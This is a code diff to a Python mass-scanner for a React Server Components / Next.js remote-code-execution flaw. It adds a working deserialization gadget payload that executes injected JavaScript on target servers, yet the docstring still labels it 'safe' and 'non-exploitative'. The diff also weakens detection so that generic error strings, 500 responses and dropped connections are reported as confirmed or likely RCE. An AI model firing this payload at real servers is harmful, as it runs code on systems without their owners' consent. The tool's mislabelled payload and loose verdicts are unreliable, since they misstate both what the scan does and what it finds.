@@ -213,16 +213,32 @@ def build_safe_payload() -> Tuple[str, str]:
     """Build safe side-channel detection payload (non-exploitative)."""
     boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
 
+    prefix_payload = (
+        f"var res='SAFE_CHECK';"
+        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
+        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
+    )
+
+    part0 = (
+        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
+        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
+        + prefix_payload
+        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
+    )
+
     body = (
         f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
         f'Content-Disposition: form-data; name="1"\r\n\r\n'
         f"{{}}\r\n"
         f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
         f'Content-Disposition: form-data; name="0"\r\n\r\n'
-        f'["$1:aa:aa"]\r\n'
+        f"{part0}\r\n"
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+        f'Content-Disposition: form-data; name="2"\r\n\r\n'
+        f"[]\r\n"
         f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
     )
-
+    
     content_type = f"multipart/form-data; boundary={boundary}"
     return body, content_type
 
@@ -387,7 +403,7 @@ class RSCScanner:
     def __init__(
             self,
             concurrency: int = 20,
-            timeout: float = 10.0,
+            timeout: float = 25.0,
             rate_limit: float = 0.0,
             paths: Optional[List[str]] = None,
             user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -531,22 +547,42 @@ class RSCScanner:
         if status_code != 500:
             return False, "Status code not 500"
 
-        if 'E{"digest"' not in body:
-            return False, "Error digest not found"
+        # Check for specific error signatures
+        server_error_indicators = [
+            'E{"digest"',          # Standard React error digest
+            'TypeError',           # Common crash (like digest access on null)
+            'NEXT_REDIRECT',       # Error object we threw
+            'digest',              # Error property
+        ]
+        
+        if any(indicator in body for indicator in server_error_indicators):
+             return True, "Side-channel indicates vulnerable (500 + error signature found)"
 
         # Check for mitigations
         mitigation = self._detect_mitigation(headers)
         if mitigation:
             return False, f"Mitigated by {mitigation}"
 
-        return True, "Side-channel indicates vulnerable (500 + error digest)"
+        # If it's a 500 but no specific signature, it's weaker evidence but still suspicious
+        # For now, require signature to avoid false positives
+        return False, "500 error but no specific RSC error signature found"
 
-    def _is_vulnerable_rce_check(self, headers: Dict[str, str]) -> Tuple[bool, str]:
+    def _is_vulnerable_rce_check(self, status_code: int, body: str, headers: Dict[str, str]) -> Tuple[bool, str]:
         """Check if response indicates successful RCE exploitation."""
+        # Check standard redirect indicator
         redirect_header = headers.get("x-action-redirect", "")
         if re.search(r'.*/login\?a=11111.*', redirect_header):
             return True, f"RCE confirmed via X-Action-Redirect: {redirect_header}"
-        return False, "RCE payload did not trigger expected redirect"
+
+        # Check for server crash/error patterns typical of successful payload processing
+        # The payload often causes a 500 error when it executes but fails to handle the redirect properly
+        if status_code == 500:
+            if "digest" in body and "TypeError" in body:
+                return True, "RCE confirmed: Payload triggered specific deserialization error"
+            if "NEXT_REDIRECT" in body:
+                return True, "RCE confirmed: Payload execution trace found"
+            
+        return False, "RCE payload did not trigger expected redirect or error state"
 
     async def _resolve_redirects(self, session: aiohttp.ClientSession,
                                   url: str, max_redirects: int = 5) -> str:
@@ -617,7 +653,11 @@ class RSCScanner:
                 allow_redirects=False,
                 ssl=self.verify_ssl if self.verify_ssl else False,
             ) as response:
-                resp_body = await response.text()
+                try:
+                    resp_body = await response.text(errors='replace')
+                except Exception:
+                    resp_body = ""
+                
                 resp_headers = dict(response.headers)
 
                 # Check for mitigation first
@@ -639,7 +679,7 @@ class RSCScanner:
                         result.vulnerability_status = VulnerabilityStatus.NOT_VULNERABLE
                         result.verification_details = details
                 else:
-                    is_vuln, details = self._is_vulnerable_rce_check(resp_headers)
+                    is_vuln, details = self._is_vulnerable_rce_check(response.status, resp_body, resp_headers)
                     if is_vuln:
                         result.vulnerability_status = VulnerabilityStatus.CONFIRMED
                         result.verification_details = details
@@ -648,8 +688,13 @@ class RSCScanner:
                         result.vulnerability_status = VulnerabilityStatus.NOT_VULNERABLE
                         result.verification_details = details
 
+        except aiohttp.ServerDisconnectedError:
+            # Server crashing immediately is a strong sign of RCE payload working (crashes the process)
+            result.vulnerability_status = VulnerabilityStatus.LIKELY
+            result.verification_details = "Vulnerability LIKELY: Server disconnected/crashed during payload execution"
+            
         except Exception as e:
-            result.verification_details = f"Verification failed: {str(e)[:50]}"
+            result.verification_details = f"Verification failed: {type(e).__name__}: {str(e)[:100]}"
 
     async def _check_url(
             self,
